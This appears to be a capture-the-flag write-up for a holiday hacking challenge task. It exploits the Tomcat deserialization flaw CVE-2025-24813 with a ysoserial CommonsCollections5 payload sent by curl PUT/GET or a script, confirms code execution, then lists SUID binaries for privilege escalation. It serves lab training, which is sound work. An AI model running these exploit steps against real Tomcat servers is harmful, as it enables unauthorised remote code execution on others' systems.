# TASK 20 - Snowcat RCE & Priv Esc
Difficulty: ❄️❄️❄️

[Direct Link](https://hhc25-wetty-prod.holidayhackchallenge.com/?&challenge=termSnowcat)

## OBJECTIVE : ##
>Tom, in the hotel, found a wild Snowcat bug. Help him chase down the RCE! Recover and submit the API key not being used by snowcat.


## HINTS: ##
<details>
  <summary>Hints provided for Task 18</summary>
  
>-	Maybe we can inject commands into the calls to the temperature, humidity, and pressure monitoring services.
>-  If you're feeling adventurous, maybe you can become root to figure out more about the attacker's plans.
>-  Snowcat is closely related to Tomcat. Maybe the recent Tomcat Remote Code Execution vulnerability (CVE-2025-24813) will work here.


</details>

#

## PROCEDURE : ##

notes.md:
```
# Remote Code Execution exploiting RCE-2025-24813

Snowcat is a webserver adapted to life in the arctic.
Can you help me check to see if Snowcat is vulnerable to RCE-2025-24813 like its cousin Tomcat?

## Display ysoserial help, lists payloads, and their dependencies:
```
  java -jar ysoserial.jar
```

## Identify what libraries are used by the Neighborhood Weather Monitoring system

## Use ysoserial to generate a payload

Store payload in file named payload.bin

## Attempt to exploit RCE-2025-24813 to execute the payload

```
export HOST=TODO_INSERT_HOST
export PORT=TODO_INSERT_PORT
export SESSION_ID=TODO_INSERT_SESSION_ID

curl -X PUT \
  -H "Host: ${HOST}:${PORT}" \
  -H "Content-Length: $(wc -c < payload.bin)" \
  -H "Content-Range: bytes 0-$(($(wc -c < payload.bin)-1))/$(wc -c < payload.bin)" \
  --data-binary @payload.bin \
  "http://${HOST}:${PORT}/${SESSION_ID}/session"

curl -X GET \
  -H "Host: ${HOST}:${PORT}" \
  -H "Cookie: JSESSIONID=.${SESSION_ID}" \
  "http://${HOST}:${PORT}/"
```


# Privilege Escalation

The Snowcat server still uses some C binaries from an older system iteration.
Replacing these has been logged as technical debt.
<TOOD_INSERT_ELF_NAME> said he thought these components might create a privilege escalation vulnerability.
Can you prove these components are vulnerable by retrieving the key that is not used by the Snowcat hosted Neighborhood Weather Monitoring Station?
```


```
user@weather:~$ java -jar ysoserial.jar CommonsCollections5 "touch /tmp/this_worked" > payload.bin
user@weather:~$ base64 -w0 payload.bin > payload.b64
user@weather:~$ python3 CVE-2025-24813.py --host localhost --port 80 --base64-payload "$(cat payload.b64)"
[*] Sending PUT request with serialized session data...
[PUT] Status: 409 
<!doctype html><html lang="en"><head><title>HTTP Status 409 – Conflict</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 409 – Conflict</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Description</b> The request could not be completed due to a conflict with the current state of the target resource.</p><hr class="line" /><h3>Apache Tomcat/9.0.90</h3></body></html>
[*] Sending GET request with session cookie...
[GET] Status: 500 
<!doctype html><html lang="en"><head><title>HTTP Status 500 – Internal Server Error</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500 – Internal Server Error</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> class javax.management.BadAttributeValueExpException cannot be cast to class java.lang.Long (javax.management.BadAttributeValueExpException is in module java.management of loader &#39;bootstrap&#39;; java.lang.Long is in module java.base of loader &#39;bootstrap&#39;)</p><p><b>Description</b> The server encountered an unexpected condition that prevented it from fulfilling the request.</p><p><b>Exception</b></p><pre>java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class java.lang.Long (javax.management.BadAttributeValueExpException is in module java.management of loader &#39;bootstrap&#39;; java.lang.Long is in module java.base of loader &#39;bootstrap&#39;)
        org.apache.catalina.session.StandardSession.doReadObject(StandardSession.java:1199)
        org.apache.catalina.session.StandardSession.readObjectData(StandardSession.java:846)
        org.apache.catalina.session.FileStore.load(FileStore.java:203)
        org.apache.catalina.session.PersistentManagerBase.loadSessionFromStore(PersistentManagerBase.java:723)
        org.apache.catalina.session.PersistentManagerBase.swapIn(PersistentManagerBase.java:672)
        org.apache.catalina.session.PersistentManagerBase.findSession(PersistentManagerBase.java:467)
        org.apache.catalina.connector.Request.doGetSession(Request.java:2722)
        org.apache.catalina.connector.Request.getSessionInternal(Request.java:2467)
        org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:451)
        org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93)
        org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:660)
        org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:346)
        org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:388)
        org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63)
        org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:936)
        org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791)
        org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52)
        org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1190)
        org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659)
        org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:63)
        java.base&#47;java.lang.Thread.run(Thread.java:829)
</pre><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/9.0.90</h3></body></html>
user@weather:~$ ls /tmp/
hsperfdata_root  hsperfdata_snowcat  hsperfdata_user  pwned  this_worked
```

```
user@weather:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/authbind/helper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/chfn
/usr/bin/mount
/usr/bin/chsh
/usr/bin/su
/usr/bin/sudo
/usr/local/weather/humidity
/usr/local/weather/pressure
/usr/local/weather/temperature
```
